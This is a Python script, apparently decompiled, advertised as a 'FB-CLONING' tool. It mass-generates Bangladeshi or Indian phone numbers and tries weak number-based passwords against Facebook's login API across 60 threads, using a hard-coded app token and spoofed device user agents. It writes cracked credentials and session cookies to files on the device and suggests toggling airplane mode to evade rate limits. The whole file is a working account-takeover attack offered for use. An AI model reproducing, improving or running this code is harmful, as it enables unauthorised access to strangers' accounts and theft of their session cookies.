#---------#DAVLOPER : SHOHAG-----#

#==== SC SEND BY > KALYAN KING

#==== TEAM ; KGF CYBER TEAM

import os
import time
import random
import string
import re
import sys
import requests
import json
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# This will effectively import all names from string, but it's generally discouraged.
# from string import * # The bytecode does INTRINSIC_IMPORT_STAR for string module at one point.
# However, specific uses like string.digits are visible, so direct import is fine.

# ANSI Color Codes
B = '\x1b[10;90m'
R = '\x1b[10;91m'
G = '\x1b[10;92m'
H = '\x1b[10;93m' # Not used in provided snippets, but defined
BL = '\x1b[10;94m' # Not used in provided snippets, but defined
BG = '\x1b[10;95m' # Not used in provided snippets, but defined
S = '\x1b[10;96m'  # Not used in provided snippets, but defined
W = '\x1b[10;97m'
EX = '\x1b[0m'   # Not used in provided snippets, but defined
E = '\x1b[m'     # General reset

# Global Variables
dt = '•'
version = '1.07'
ok = []
cp = []
twf = []
lop = 0
xode = []
# plist = [] # Not used in the logic shown
cpx = []
cokix = []
# apkx = [] # Not used
# paswtrh = [] # Not used
rcd = [] # Stores user choice for country/action
# rcdx = [] # Not used
# ugen = [] # Not used
# ugtn = [] # Not used
# ugxn = [] # Not used
lk = [] # This list is initialized but never appended to. Used in graphrm's status len(lk). Likely meant to be len(cp).
# togg = [] # Not used

# Device model lists (xxxxx, gtxx, gt are identical)
device_models_tuple = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
xxxxx = device_models_tuple
gtxx = device_models_tuple # Not directly used in the shown logic but defined
gt = device_models_tuple   # Not directly used in the shown logic but defined

fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite') # Not directly used
os.system("xdg-open https://t.me/KGF_TEAM_CYBER")
os.system("xdg-open https://t.me/KGF_TEAM_CYBER")
logo = ('\n   \x1b[38;5;196m ██████ \x1b[33;1m██    ██ \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██████  \n'
        '   \x1b[38;5;196m██       \x1b[33;1m██  ██  \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ \n'
        '   \x1b[38;5;196m██        \x1b[33;1m████   \x1b[38;5;46m██████  \x1b[34;1m█████   \x1b[38;5;196m██████  \n'
        '   \x1b[38;5;196m██         \x1b[33;1m██    \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ \n'
        '   \x1b[38;5;196m ██████    \x1b[33;1m██    \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██   ██ \n'
        '\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
        '  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mDEVELOPER \x1b[1;91m :   \x1b[1;92mSHOHAG-KHAN\n'
        '  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mSCRIPT SEND  \x1b[1;91m  :   \x1b[1;92mKALYAN KING \n'
        '  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mFREE\n'
        '  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL    \x1b[1;91m   :   \x1b[1;92mFB-CLONING\n'
        '\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')

print_lock = threading.Lock() # For thread-safe printing in graphrm

def f4():
    poco_models = ['Poco F1', 'Poco X3 NFC', 'Poco M3', 'Poco F2 Pro', 'Poco X4 Pro', 'Poco M4 Pro']
    user_agent = (
        f"[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};FBBV/"
        f"{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=1080,height=2400}};FBLC/en_US;FBRV/"
        f"{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/"
        f"{random.choice(poco_models)};FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a;]"
    )
    return user_agent

def clear():
    os.system('clear')
    print(logo)

def line():
    print('===============================================')

def tutulx(fx):
    tutulxz = "2023/2024" # Default value
    len_fx = len(str(fx)) # Ensure fx is string for slicing

    if len_fx == 15:
        if fx.startswith('1000000000'): tutulxz = '2009'
        elif fx.startswith('100000000'): tutulxz = '2009'
        elif fx.startswith('10000000'): tutulxz = '2009'
        elif fx.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): tutulxz = '2009'
        elif fx.startswith(('1000006', '1000007', '1000008', '1000009')): tutulxz = '2010'
        elif fx.startswith('100001'): tutulxz = '2010/2011'
        elif fx.startswith(('100002', '100003')): tutulxz = '2011/2012'
        elif fx.startswith('100004'): tutulxz = '2012/2013'
        elif fx.startswith(('100005', '100006')): tutulxz = '2013/2014' # Original was 100005, 100006
        elif fx.startswith(('100007', '100008')): tutulxz = '2014/2015'
        elif fx.startswith('100009'): tutulxz = '2015'
        elif fx.startswith('10001'): tutulxz = '2015/2016' # Sliced by 5
        elif fx.startswith('10002'): tutulxz = '2016/2017' # Sliced by 5
        elif fx.startswith('10003'): tutulxz = '2018/2019' # Sliced by 5
        elif fx.startswith('10004'): tutulxz = '2019'      # Sliced by 5
        elif fx.startswith('10005'): tutulxz = '2020'      # Sliced by 5
        # Note: original bytecode had 100006, 100007, 100008 for 2021/2022 with 5 char slice, conflicting with 6 char slice earlier
        # Prioritizing the more specific (longer slice) or first encountered rule.
        # Given the structure, the 6-char slice rules would hit first if applicable.
        # The last explicit rule for 15-char was '2020', so if none of above, it would have defaulted.
        # The bytecode had a final "else" like assignment to '2023' if 15 len and no prefix match.
        else: tutulxz = '2023'

    elif len_fx == 9 or len_fx == 10: tutulxz = '2008/2009'
    elif len_fx == 8: tutulxz = '2007/2008'
    elif len_fx == 7: tutulxz = '2006/2007'
    # Default for other lengths is '2023/2024'
    return tutulxz

# Formatted Strings for UI
BDX = f"\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mBD SIM CODE \x1b[10;91m• {G}013 014 015 016 017 018 019{E}{W}"
INDX = f"{W}IND SIM CODE : {G}9670 9725 8948 8795 6383{E}{W}"
PAKX = f"{W}PAK SIM CODE : {G}0306 0315 0335 0345 0318{E}{W}" # Defined but not used by menu logic
LIMITX = f"[{G}+{W}] EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}"
CPG = f"[{G}+{W}] Do You Went Show Cp Account (y/n)"
CKIG = f"[{G}+{W}] Do You Went Show Cookie (y/n)"
chc = f"[{G}+{W}] \x1b[10;92mCHOOSE \x1b[10;91m•\x1b[10;92m "
flp = f"{W}[{G}•{W}] PUT FILE PATH\x1b[1;37m : {G}" # Not used by this script flow
chcps = f"EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}" # Not used by this script flow
mxxt = (
    f"{W}[{G}A{W}] METHOD [{G}1{W}]\n"
    f"{W}[{G}B{W}] METHOD [{G}2{W}]\n"
    f"{W}[{G}C{W}] METHOD [{G}3{W}]"
) # Not used by this script flow
nflp = f"[{R}!{W}] FILE LOCATION NOT FOUND " # Not used by this script flow

dateti = ""
proxsi = []

def initial_setup():
    global dateti, proxsi
    try:
        os.system('pkg install sox -y')
        os.system('pkg install espeak -y') # Added -y for non-interactive
    except Exception as e:
        print(f"{R}Failed to install packages: {e}{E}")

    # os.system('clear') # clear will be called by Main first
    # os.system('espeak -a 300 "well,come to,CYBER, King tools"') # Welcome sound

    dateti = str(datetime.now()).split(' ')[0]

    try:
        proxylist_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all'
        proxylist_text = requests.get(proxylist_url, timeout=10).text
        with open('socksku.txt', 'w') as f:
            f.write(proxylist_text)
        with open('socksku.txt', 'r') as f:
            proxsi = f.read().splitlines()
    except Exception as e:
        print(f"{R}Could not fetch or save proxy list: {e}{E}")
        proxsi = []


def graphrm(id_param, psd_list_param, tid_param):
    global lop, ok, cp, twf
    
    # Initial status print per thread call (original behavior, can be messy)
    with print_lock:
        sys.stdout.write(f'\r\r{W}[{G}={W}]{R}~{W}[{G}CYBER-QR-HACKER{W}-{G}M1{W}]>~[{G}{lop}{W}]>~<[{G}{tid_param}{W}]>~[{G}OK{R}•{G}{len(ok)}{R}/{H}{len(cp)}{W}] ')
        sys.stdout.flush()

    for psw in psd_list_param:
        try:
            # User agent for this specific request type in graphrm
            gtt_model = random.choice(xxxxx) # xxxxx is device_models_tuple
            android_version = random.randint(4, 13)
            build_qp1a = f"QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}"
            
            # UA used inside graphrm for its specific API call if needed, but header uses f4()
            # internal_ua = (
            #     f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {gtt_model} Build/{build_qp1a}) "
            #     f"[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{{density=3.3,width=1080,height=1430}};FBLC/en_GB;FBRV/859351995;FBCR/AT&amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
            # )

            datax = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': id_param,
                'password': psw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_GB', 
                'client_country_code': 'GB', 
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'graphservice', # Or another relevant caller class
            }

            header = {
                'User-Agent': f4(), # Uses the global f4() for UA
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'unknown',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            
            api_url = 'https://b-graph.facebook.com/auth/login'
            response = requests.post(api_url, data=datax, headers=header, allow_redirects=False, timeout=15)
            lo = response.json()

            msg_2fa = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'

            if 'session_key' in lo:
                cki_list = lo.get('session_cookies', [])
                ck_dict = {xk['name']: xk['value'] for xk in cki_list if 'name' in xk and 'value' in xk}
                coki = ";".join([f"{k}={v}" for k, v in ck_dict.items()])
                
                iid_match = re.search(r'c_user=([^;]+)', coki)
                iid = iid_match.group(1) if iid_match else id_param # Fallback to id_param if c_user not found

                with print_lock:
                    sys.stdout.write(f'\r\r{G}[CYBER-Ok💚] {iid} | {psw} {R}•> {G}{tutulx(iid)} \n')
                    sys.stdout.flush()
                
                os.system('espeak -a 300 "QR-HACKER,  Ok,  id"')
                ok.append(id_param)
                with open('/sdcard/1T-OK.txt', 'a') as f_ok:
                    f_ok.write(f"{iid} | {psw} | {id_param}  ------------>>>{coki}\n")
                
                if 'y' in cokix:
                    with print_lock:
                        sys.stdout.write(f'\r\r{H}[🌺] {R}= {H}COOKIES{R} •  {R}{coki}{E}\n')
                        sys.stdout.write(f'{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{E}\n')
                        sys.stdout.flush()
                break # Password found

            elif msg_2fa in str(lo):
                uid_2fa = lo.get('error', {}).get('error_data', {}).get('uid', id_param)
                with print_lock:
                    sys.stdout.write(f'\r\r{W}[{G}={W}]{R}~{S}[CYBER-2F] {uid_2fa} | {psw}{W}\n')
                    sys.stdout.flush()
                os.system('espeak -a 300 "2F"')
                with open('/sdcard/1T-2F.txt', 'a') as f_2f:
                    f_2f.write(f"{uid_2fa} | {psw} | {id_param}\n")
                twf.append(id_param)
                # Continues to try other passwords for this ID even on 2FA

            elif 'www.facebook.com' in lo.get('error', {}).get('message', ''):
                uid_cp = lo.get('error', {}).get('error_data', {}).get('uid', id_param)
                if uid_cp not in ok: # Check if not already found as OK
                    if 'y' in cpx:
                        with print_lock:
                            sys.stdout.write(f'\r\r{W}[{G}={W}]{R}~{H}[CYBER-Cp] {uid_cp} | {psw}{W}\n')
                            sys.stdout.flush()
                    cp.append(id_param)
                    os.system('espeak -a 300 "Cp"')
                    with open('/sdcard/1T-CP.txt', 'a') as f_cp:
                        f_cp.write(f"{uid_cp} | {psw} | {id_param}\n")
                # Continues to try other passwords

        except requests.exceptions.ConnectionError:
            time.sleep(15) # Longer sleep for connection errors
            continue # To next password or retry
        except Exception: # Catch other request/json errors
            continue # To next password
    
    lop += 1
    # The main status line update is handled by the initial print in each thread call.
    # A more robust way would be a single thread updating the status periodically.


def rmenu1():
    global xode # Ensure xode is global if modified
    clear()
    
    chosen_country_for_sim_display = None
    if '1' in rcd: # BD
        print(f"{BDX}")
        chosen_country_for_sim_display = "BD"
    elif '3' in rcd: # IND
        print(f"{INDX}")
        chosen_country_for_sim_display = "IND"
    # elif 'SOME_PAK_CODE' in rcd: # For PAK
    #     print(f"{PAKX}")
    #     chosen_country_for_sim_display = "PAK"

    if '2' in rcd: # Contact Admin option was chosen in Main
        print(f'                {G}Admin Telegram Channel{E}')
        os.system('xdg-open https://t.me/KGF_TEAM_CYBER')
        time.sleep(3)
        Main() # Go back to main after contacting
        return

    # If a country was chosen for cloning, proceed
    if not chosen_country_for_sim_display:
        print(f"{R}No valid cloning option selected from Main.{E}")
        time.sleep(2)
        Main()
        return

    line()
    code = input(f"{chc}") # SIM prefix like 017, 9670 etc.
    print(f'{W}===============================================')
    print(f"{LIMITX}")
    line()
    
    limit_input_str = input(f"[{G}+{E}] Limit : {G}")
    try:
        limit = int(limit_input_str)
    except ValueError:
        print(f"{R}Invalid limit. Please enter a number.{E}")
        return # Or Main()
        
    print(f"{W}===============================================")

    print(f"{CPG}")
    line()
    cx = input(f"{chc}").lower()
    cpx.clear()
    if cx in ('n', 'no', '2'):
        cpx.append('n')
    else:
        cpx.append('y')
    
    print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"{CKIG}")
    line()
    ckiv = input(f"{chc}").lower()
    cokix.clear()
    if ckiv in ('n', 'no', '2'):
        cokix.append('n')
    else:
        cokix.append('y')

    xode = [] # Clear previous numbers
    digits_to_generate = 0
    if '1' in rcd: digits_to_generate = 8 # BD
    elif '3' in rcd: digits_to_generate = 6 # IND
    # Add other country digit lengths here
    # elif chosen_country_for_sim_display == "PAK": digits_to_generate = 7

    if digits_to_generate > 0:
        for _ in range(limit):
            number_suffix = "".join(random.choice(string.digits) for _ in range(digits_to_generate))
            xode.append(number_suffix)
    else:
        print(f"{R}Configuration error for number generation.{E}")
        return

    with ThreadPoolExecutor(max_workers=60) as tonxoys:
        total_ids_to_crack = str(len(xode))
        clear() # Clear before showing progress UI
        print(f'{G}┏━{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        # User name is not dynamically set here in original bytecode for this print block
        print(f'{G}┣━{W}[{G}+{W}]{B} USER NAME{R} :{S} CYBER KING ') # Example, original had no name here
        print(f'{G}┣━{W}[{G}+{W}] {R}YOUR TOTAL ID :{G} {total_ids_to_crack}')
        print(f'{G}┣━{W}[{G}+{W}]{G} Started Time Date {R}: {H}{dateti}')
        print(f'{G}┣━{W}[{G}+{W}] {B}USE YOUR {BG}AIRPLANE MODE {W}[{G}ON{R}/{G}OFF{W}] {G}AFTER{R}-{G}3 MIN')
        print(f'{G}┗━{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

        for random_suffix_part in xode:
            full_id_num = code + random_suffix_part
            pass_list = []
            if '1' in rcd: # BD passwords
                # Example: id, rngx, id[:6], id[:7], id[:8], id[5:]
                pass_list = [
                    full_id_num, random_suffix_part,
                    full_id_num[:6], full_id_num[:7], full_id_num[:8],
                    full_id_num[5:] # Assuming full_id_num has prefix, so this is from middle
                ]
            elif '3' in rcd: # IND passwords
                 # Example: id, rngx, id[:6], '57273200'
                pass_list = [
                    full_id_num, random_suffix_part,
                    full_id_num[:6], '57273200'
                ]
            # Add other country password lists
            # elif chosen_country_for_sim_display == "PAK":
            #     pass_list = [random_suffix_part, full_id_num[:6], "khan123", "pakistan"]

            # Remove duplicates from pass_list just in case
            pass_list = list(dict.fromkeys(pass_list))
            if pass_list:
                tonxoys.submit(graphrm, full_id_num, pass_list, total_ids_to_crack)
    
    print(f"\n{G}Cloning process finished.{E}")
    # Final results summary (optional)
    print(f"{G}OK: {len(ok)}, CP: {len(cp)}, 2F: {len(twf)}{E}")


def Main():	
    print(f'{G}┣━{W}[{G}1{W}] {G}RANDOM BANGLADESH CLONER {W}')
    print(f'{G}┣━{W}[{G}2{W}] {H}RANDOM INDIA CLONER {W}') # Added for option 'C','c','3' -> rcd='3'
    # Add other cloner options if any (e.g., PAK)
    print(f'{G}┣━{W}[{G}3{W}] {S}CONTACT WITH ADMIN{W}') # Changed to 3 for contact, matching rcd='2'
    print(f'{G}┣━{W}[{G}0{W}] {R}EXIT{W}')
    
    ghx = input(f'{G}┗━{W}[{G}+{W}] {G}CHOOSE {R}:{G} ').lower()
    rcd.clear()

    if ghx in ('1', 'a'): # BD Cloner
        rcd.append('1')
        rmenu1()
    elif ghx in ('2', 'b'): # IND Cloner (mapped 'C','c','3' to this menu option)
        rcd.append('3') # '3' is used in rmenu1 for INDX and IND passwords
        rmenu1()
    elif ghx in ('3', 'c'): # Contact Admin (mapped 'B','b','2' to this menu option)
        rcd.append('2') # '2' is used in rmenu1 for contact admin link
        rmenu1() 
    elif ghx == '0':
        print(f"{R}Exiting tool...{E}")
        sys.exit()
    else:
        line()
        print(f"\n \t {R}Choose Valid Option{E}")
        time.sleep(1)
        Main()

if __name__ == "__main__":
    initial_setup()
    os.system('espeak -a 300 "well,come to,kalyan, King,KGF hacker, team tools Script send"')
    Main()